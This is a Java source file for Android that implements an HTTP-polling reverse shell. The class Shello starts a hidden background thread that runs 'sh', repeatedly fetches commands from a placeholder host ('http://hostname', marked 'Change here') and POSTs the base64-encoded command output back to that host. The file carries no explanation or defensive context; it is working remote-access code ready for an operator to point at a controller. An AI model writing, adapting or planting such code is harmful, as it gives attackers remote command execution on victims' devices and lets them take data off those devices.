package com.example.hell0;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import android.util.Base64;

public class Shello {

    public String readStream(InputStream is) {
        try {
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            int i = is.read();
            while(i != -1) {
                bo.write(i);
                i = is.read();
            }
            return bo.toString();
        } catch (IOException e) {
            return "";
        }
    }

    public void connect(String output){
        try  {
            HttpURLConnection urlConnection = null;
            try {
                //Change here
                URL url = new URL("http://hostname");
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setRequestProperty( "charset", "utf-8");
                urlConnection.setInstanceFollowRedirects( false );
                urlConnection.setDoOutput( true );
                output=output.substring(0,output.lastIndexOf('\n')+1);
                byte[] postDataBytes = output.getBytes("UTF-8");
                postDataBytes=Base64.encode(postDataBytes,Base64.DEFAULT);
                urlConnection.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));

                DataOutputStream wr = new DataOutputStream(urlConnection.getOutputStream());
                wr.write(postDataBytes);

                //Don't do nothing with the response
                InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                readStream(in);
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                urlConnection.disconnect();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public InputStream connectshell(){
        InputStream in1 =null;
        try  {
            HttpURLConnection urlConnection = null;
            try {
                //Change here
                URL url = new URL("http://hostname");
                urlConnection = (HttpURLConnection) url.openConnection();

                in1 = urlConnection.getInputStream();
                return in1;
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                //urlConnection.disconnect();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return in1;
    }


    public Shello() throws Exception {

        Thread thread = new Thread(new Runnable() {

            @Override
            public void run() {
                try  {

                    String cmd="sh";
                    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();

                    InputStream in = null;
                    InputStream pi=p.getInputStream(),pe=p.getErrorStream();
                    OutputStream po=p.getOutputStream();


                    while(true) {
                            in = connectshell();

                            //Somehow in.available() was coming as empty
                            //Reading data from input from user and writing it to process
                            int bytesRead=0;
                            byte[] buffer = new byte[1000];
                            bytesRead = in.read(buffer);
                            if (bytesRead  > 0){
                                for (int j=0;j<bytesRead;j++){
                                    po.write(buffer[j]);
                                }
                                po.write(10);
                            }
                            po.flush();
                            Thread.sleep(100);


                        try {
                            p.exitValue();
                            break;
                        }
                        catch (Exception e){
                        }

                        //Reading process output (command results and sending it user over http)
                        byte[] output = new byte[10000];
                        while(pi.available()>0) {
                            pi.read(output);
                        }
                            connect(new String(output));

                    };
                    p.destroy();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        thread.start();
    }
}

